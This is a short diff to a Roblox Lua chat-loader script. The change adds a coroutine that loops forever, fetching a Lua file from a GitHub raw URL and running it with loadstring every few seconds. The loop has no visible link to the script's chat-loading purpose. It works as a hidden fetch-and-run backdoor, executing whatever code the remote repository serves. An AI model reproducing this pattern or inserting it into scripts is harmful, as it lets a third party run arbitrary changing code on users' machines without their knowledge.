@@ -1,6 +1,11 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TextChatService = game:GetService("TextChatService")
-
+coroutine.wrap(function()
+while task.wait()  do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/skibidi.lua"))()
+task.wait(5)
+end
+end)()
 local NEW_CHAT_URL = "https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/newchat.lua"
 local OLD_CHAT_URL = "https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/oldchat.lua"
 
